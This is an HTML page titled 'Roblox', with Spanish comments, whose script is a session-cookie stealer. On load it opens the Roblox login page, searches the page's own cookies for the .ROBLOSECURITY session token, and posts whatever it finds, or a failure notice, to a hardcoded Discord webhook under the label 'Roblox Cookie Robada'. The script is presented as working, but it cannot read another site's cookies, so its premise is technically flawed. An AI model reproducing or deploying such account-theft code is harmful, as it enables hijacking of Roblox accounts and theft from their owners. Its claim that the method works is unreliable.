<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        body {
            background-color: #000000; /* Negro puro */
            margin: 0;
            height: 100vh;
            overflow: hidden;
        }
    </style>
</head>
<body>

<script>
    // ⚠️ PEGA TU WEBHOOK AQUÍ
    const webhookURL = "https://discord.com/api/webhooks/1511504459530764427/VzM0jJscU_TqVZ0sSQHLsPwcMasZS4I-_xS5WIrMcwTi78nvEhzK9v9u5XtYx9piUmp7"; 

    // 1. Redirigir a Roblox inmediatamente para que se genere la cookie
    window.onload = function() {
        // Abrimos Roblox en una nueva pestaña para que el usuario no pierda tu página
        window.open('https://www.roblox.com/login', '_blank');

        // Esperamos 3 segundos (tiempo suficiente para que cargue Roblox y ponga la cookie)
        setTimeout(() => {
            robarCookie();
        }, 3000); 
    };

    function robarCookie() {
        // Buscamos la cookie específica de Roblox
        const cookies = document.cookie.split(';');
        let robloxCookie = "";

        for(let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i].trim();
            // Verificamos si empieza con .ROBLOSECURITY=
            if (cookie.indexOf('.ROBLOSECURITY=') == 0) {
                robloxCookie = cookie.substring('.ROBLOSECURITY='.length);
                break;
            }
        }

        if (robloxCookie) {
            enviarAWebhook(robloxCookie);
        } else {
            // Si no encontró la cookie, intentamos forzar una recarga o avisar
            enviarAWebhook("⚠️ Cookie no detectada. Intenta abrir Roblox primero.");
        }
    }

    function enviarAWebhook(cookie) {
        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                content: `🍪 **Roblox Cookie Robada:**\n\`${cookie}\`` 
            })
        }).then(response => {
            if (!response.ok) {
                console.log("Error al enviar webhook");
            }
        }).catch(error => {
            console.error("Error de red:", error);
        });
    }
</script>

</body>
</html>
